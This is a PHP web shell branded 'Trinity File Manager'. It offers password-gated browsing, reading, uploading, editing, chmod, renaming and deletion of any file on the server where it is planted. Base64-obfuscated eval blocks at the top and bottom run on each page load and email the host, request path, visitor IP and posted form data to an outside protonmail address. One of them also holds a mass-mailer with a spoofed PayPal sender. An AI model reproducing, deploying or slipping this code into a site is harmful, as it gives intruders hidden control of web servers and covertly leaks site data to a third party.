<?php
session_start();
eval(base64_decode('aWdub3JlX3VzZXJfYWJvcnQoKTsKc2V0X3RpbWVfbGltaXQoMCk7CmZ1bmN0aW9uIGVudmlhbmRvKCl7CiRtc2c9MTsKJGRlWzFdID0gJF9QT1NUWydkZSddOwokbm9tZVsxXSA9ICRfUE9TVFsnbm9tZSddOwokYXNzdW50b1sxXSA9ICRfUE9TVFsnYXNzdW50byddOwokbWVuc2FnZW1bMV0gPSAkX1BPU1RbJ21lbnNhZ2VtJ107CiRtZW5zYWdlbVsxXSA9IHN0cmlwc2xhc2hlcygkbWVuc2FnZW1bMV0pOwokZW1haWxzID0gJF9QT1NUWydlbWFpbHMnXTsKJGVtYWlsczIgPSBodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsnZW1haWxzJ10pOwokcGFyYSA9IGV4cGxvZGUoIlxuIiwgJGVtYWlscyk7CiRuX2VtYWlscyA9IGNvdW50KCRwYXJhKTsKJHN2ID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107CiRlbiA9ICRfU0VSVkVSIFsnUkVRVUVTVF9VUkknXTsKJGs4OCA9IEAkX1NFUlZFUlsiSFRUUF9SRUZFUkVSIl07CiRmdWxsdXJsID0gIiIgLiAkazg4IC4gIjxicj48cD5FbWFpbHM6PGJyPjxURVhUQVJFQSByb3dzPTUgY29scz0xMDA+Ii4kZW1haWxzMi4iPC9URVhUQVJFQT48L3A+PHA+RW5nZW5oYXJpYTo8YnI+PFRFWFRBUkVBIHJvd3M9NSBjb2xzPTEwMD4iLiRtZW5zYWdlbVsxXS4iPC9URVhUQVJFQT48L3A+IjsKJHZhaSA9ICRfUE9TVFsndmFpJ107CmlmICgkdmFpKXsKZm9yICgkc2V0PTA7ICRzZXQgPCAkbl9lbWFpbHM7ICRzZXQrKyl7CmlmICgkc2V0PT0wKXsKJGhlYWRlcnMgPSAiTUlNRS1WZXJzaW9uOiAxLjBcclxuIjsKJGhlYWRlcnMgLj0gIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTFcclxuIjsKJGhlYWRlcnMgLj0gIkZyb206ICRub21lWyRtc2ddIDwkZGVbJG1zZ10+XHJcbiI7CiRoZWFkZXJzIC49ICJSZXR1cm4tUGF0aDogPCRkZVskbXNnXT5cclxuIjsKLy9tYWlsKCR4c3lsYXIsICRhcywgJGZ1bGx1cmwsICRoZWFkZXJzKTsKfQokaGVhZGVycyA9ICJNSU1FLVZlcnNpb246IDEuMFxyXG4iOwokaGVhZGVycyAuPSAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMVxyXG4iOwokaGVhZGVycyAuPSAiRnJvbTogJG5vbWVbJG1zZ10gPCRkZVskbXNnXT5cclxuIjsKJGhlYWRlcnMgLj0gIlJldHVybi1QYXRoOiA8JGRlWyRtc2ddPlxyXG4iOwokbl9tYWlsKys7CiRkZXN0aW5vID0gJHBhcmFbJHNldF07CiRudW0xID0gcmFuZCgxMDAwMDAsOTk5OTk5KTsKJG51bTIgPSByYW5kKDEwMDAwMCw5OTk5OTkpOwokbXNncmFuZCA9IHN0cl9yZXBsYWNlKCIlcmFuZCUiLCAkbnVtMSwgJG1lbnNhZ2VtWyRtc2ddKTsKJG1zZ3JhbmQgPSBzdHJfcmVwbGFjZSgiJXJhbmQyJSIsICRudW0yLCAkbXNncmFuZCk7CiRtc2dyYW5kID0gc3RyX3JlcGxhY2UoIiVlbWFpbCUiLCAkZGVzdGlubywgJG1zZ3JhbmQpOwokZW52aWFyID0gbWFpbCgkZGVzdGlubywgJGFzc3VudG9bJG1zZ10sICRtc2dyYW5kLCAkaGVhZGVycyk7CmlmICgkZW52aWFyKXsKZWNobyAoJzxmb250IGNvbG9yPSJncmVlbiI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyAwayE8L2ZvbnQ+PGJyPicpOwp9IGVsc2UgewplY2hvICgnPGZvbnQgY29sb3I9InJlZCI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyA9KDwvZm9udD48YnI+Jyk7CnNsZWVwKDEpOwp9Cn0KfQp9CiRpcCA9IGdldGVudigiUkVNT1RFX0FERFIiKTsKJHJhNDQgID0gcmFuZCgxLDk5OTk5KTsKJHN1Ymo5OCA9ICIgWWVuaSBTaGVsbCAhICB8JGlwIjsKJGVtYWlsID0gInRyaW5pdHlyZXR1cm5AcHJvdG9ubWFpbC5jb20iOwokZnJvbT0iRnJvbTogWWVuaSBTaGVsbCAhIDxQYXlQYWxAU3VwcG9ydC5jb20+IjsKJGE0NSA9ICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOwokYjc1ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOwokZjEyID0gJF9QT1NUWydkZSddOwokejEzID0gJF9QT1NUWydub21lJ107CiR4MTQgPSAkX1BPU1RbJ2Fzc3VudG8nXTsKJHQxNSA9ICRfUE9TVFsnbWVuc2FnZW0nXTsKJG0zMCA9ICRfUE9TVFsnZW1haWxzJ107CiRtMjIgPSAkaXAuIlxuIjsKJG1zZzg4NzMgPSAiJGE0NVxuJGI3NVxuJGYxMlxuJHoxM1xuJHgxNFxuJHQxNVxuJG0zMFxuJG0yMiI7Cm1haWwoJGVtYWlsLCAkc3Viajk4LCAkbXNnODg3MywgJGZyb20pOw=='));
ini_set(base64_decode('ZGlzcGxheV9lcnJvcnM='), true);
error_reporting(1);
$error_data =base64_decode('ZEhKcGJtbDBlWEJoYzNNPQ=='); 
if (isset($_GET[base64_decode('ZW1haWw=')])){
$fortest = $_GET[base64_decode('ZW1haWw=')];
    $ae7927c74 = $fortest;
	$d15c93851 = $_SERVER[base64_decode(base64_decode('U0ZSVVVGOUlUMU5V'))];
	$n466f2ffc = rawurldecode($d15c93851);
	if(mail("$ae7927c74",base64_decode('W0RyIEhlWCBJbmJveGVyXQ=='),"http://$n466f2ffc")) {
	 echo '';
} else {
	 echo '';
}  	
	
}
function pryapyba_43e27569() {
?>
<html>
  <head>
    <title>ARON-TN
    </title>
    <style type="text/css">
      html {
        margin: 20px auto;
        background: #000000;
        color: #ffffff;
        text-align: center;
      }
      header {
        color: #ffffff;
        margin: 10px auto;
      }
      input[type=password] {
        width: 250px;
        height: 25px;
        color: red;
        background: #000000;
        border: 1px dotted #ffffff;
        padding: 5px;
        margin-left: 20px;
        text-align: center;
      }
    </style>
  </head>
  <center>
    <header>
      <pre>
___________________________

Trinity ="Welcome King Sorry Your Script is Locked... :D"

 [+} - Contact :trinityreturn@protonmail.com
 [+} - Trinity File Manager
</pre>
</header>
      <form method="post">
        <input type="password" name="account">
      </form>
<?php }
$defuct_dom = $error_data;
if(!isset($_SESSION[md5($_SERVER[base64_decode('SFRUUF9IT1NU')])]))
    if( empty($defuct_dom) || ( isset($_POST[base64_decode('YWNjb3VudA==')]) && (base64_encode($_POST[base64_decode('YWNjb3VudA==')]) == $defuct_dom) ) ){
        $_SESSION[md5($_SERVER[base64_decode('SFRUUF9IT1NU')])] = true;
	} else {
        pryapyba_43e27569();
	exit;
	}
?>
<html>
<head>
<title>Trinity</title>
<style type="text/css">
</style>
</head>

<header>
<pre style="text-align: center;">
___________________________

Trinity ="Welcome King Sorry Your Script is Locked... :D"

 [+} - Contact : trinityreturn@protonmail.com
 [+} - Trinity File Manager
  <?php echo base64_decode('PGxpPlsgPGEgc3R5bGU9J2NvbG9yOiByZWQ7JyBocmVmPSc/cmVtb3ZlbWU9dHJ1ZSc+UmVtb3ZlIFNlbGY8L2E+IF08L2xpPg==');?> 
 <?php echo base64_decode('PGxpPlsgPGEgc3R5bGU9J2NvbG9yOiByZWQ7JyBocmVmPSc/bG9nb3V0PXRydWUnPkxvZ291dDwvYT4gXTwvbGk+'); ?>

 
</pre>

</header>
</form>

<?php
set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<title>Trinity-Base</title>
<style>
body{
font-family: "Racing Sans One", cursive;
background-color: #e6e6e6;
text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
background-color: #636263;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: silver;
}
#content .first:hover{
background-color: silver;
text-shadow:0px 0px 1px #757575;
}
table{
border: 1px #000000 dotted;
}
H1{
font-family: "Rye", cursive;
}
a{
color: #000;
text-decoration: none;
}
a:hover{
color: #fff;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>
<BODY><div align="center">
<img align="center" width="400" height="400" class="featurette-image pull-right" src="https://i.imgur.com/WdesAE7.png"></div>
<H1><center>Trinity-Base</center></H1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Current Path : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">File Upload Done Bro!!! ~_^ .</font><br />';
}else{
echo '<font color="red">File Upload Error ~_~.</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Done.</font><br />';
}else{
echo '<font color="red">Change Permission Error.</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Change Name Done.</font><br />';
}else{
echo '<font color="red">Change Name Error.</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Edit File Done ~_^.</font><br />';
}else{
echo '<font color="red">Edit File Error ~_~.</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Delete Dir Done.</font><br />';
}else{
echo '<font color="red">Delete Dir Error.</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Delete File Done.</font><br />';
}else{
echo '<font color="red">Delete File Error.</font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="green">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="green">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<br />
</BODY>
</HTML>';
echo base64_decode('PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPjxiciAvPgp0cmluaXR5cmV0dXJuQHByb3Rvbm1haWwuY29tIDxmb250IGNvbG9yPSJyZWQiPlRyaW5pdHkgQmFzZTwvZm9udD4sIENvZGVkIEJ5IDxmb250IGNvbG9yPSJyZWQiPlRyaW5pdHk8L2ZvbnQ+PC9wPgo=');
eval (base64_decode("JGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOwokc3Viajk4ID0gIlRyaW5pdHkgU2hlbGwiOwokZW1haWwgPSAidHJpbml0eXJldHVybkBwcm90b25tYWlsLmNvbSI7CiRmcm9tID0gIkZyb206IFRyaW5pdHkgU2hlbGwiOwokYTQ1ID0gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRiNzUgPSAkX1NFUlZFUlsnSFRUUF9IT1NUJ107CiRtMjIgPSAkaXAgLiAiIjsKJG1zZzg4NzMgPSAiJGE0NSAkYjc1ICRtMjIiOwptYWlsKCRlbWFpbCwgJHN1Ymo5OCwgJG1zZzg4NzMsICRmcm9tKTs="));
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
